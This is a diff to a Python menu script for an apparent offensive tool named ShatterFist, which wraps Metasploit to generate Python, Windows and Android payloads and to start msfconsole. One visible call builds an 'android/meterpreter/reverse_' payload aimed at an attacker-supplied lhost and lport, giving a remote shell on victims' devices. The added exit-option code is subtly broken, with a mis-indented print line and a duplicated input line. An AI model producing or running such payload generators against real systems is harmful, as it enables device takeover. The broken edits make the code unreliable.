@@ -7,8 +7,8 @@ import base64
 import random
 import string 
 import time 
-#custom import 
-import varsx 
+import sys 
+
 
 
 banner= ('''@@@@@@   @@@  @@@   @@@@@@   @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@@  @@@   @@@@@@   @@@@@@@  
@@ -208,7 +208,6 @@ def androidpayload():
     asktb()
     if inputy == "1": 
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
-        #payloadgen1("android", talkbackm1, lhost, lport, androutfile)
         payloadgen2(f"android/meterpreter/reverse_{talkbackm1}", lhost, lport, androutfile, '', '')
         print(colorama.Style.RESET_ALL)
         print(colorama.Fore.LIGHTGREEN_EX + f"Done! \nSaved as {androutfile} \n\n" + colorama.Style.RESET_ALL)
@@ -227,8 +226,10 @@ def menu():
     printopt("Create a python payload (MSF)")
     printopt("Create a windows payload (MSF)")
     printopt("Create an android payload (MSF)")
-    #Option for Metasploit 
+    #Option for Metasploit Console
     print(colorama.Fore.BLUE + "[" +  colorama.Style.RESET_ALL + "M" + colorama.Fore.BLUE + "] " + colorama.Fore.LIGHTBLUE_EX + "Start the Metasploit Framework Console" + colorama.Style.RESET_ALL)
+     print(colorama.Fore.BLUE + "[" +  colorama.Style.RESET_ALL + "E" + colorama.Fore.BLUE + "] " + colorama.Fore.LIGHTBLUE_EX + "Exit ShatterFist" + colorama.Style.RESET_ALL)
+    input1 = inputcopt("Option: ").strip().lower()
     input1 = inputcopt("Option: ").strip().lower()
     if input1 == "1":
         pythonpayload()
@@ -239,7 +240,16 @@ def menu():
     elif input1 == "m":
         clearscreen()
         print(colorama.Fore.LIGHTRED_EX)
-        subprocess.run("msfconsole")    
+        subprocess.run("msfconsole")   
+    elif input1  == "e":
+        clearscreen()
+        print(colorama.Fore.LIGHTRED_EX)
+        bye = "Thanks for using ShatterFist!"
+        for letter in bye:
+            print(letter,end="", flush=True)
+            time.sleep(0.1)
+        sys.exit()
+
     else:
         print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {input1} is not valid" + colorama.Style.RESET_ALL)
         time.sleep(2)
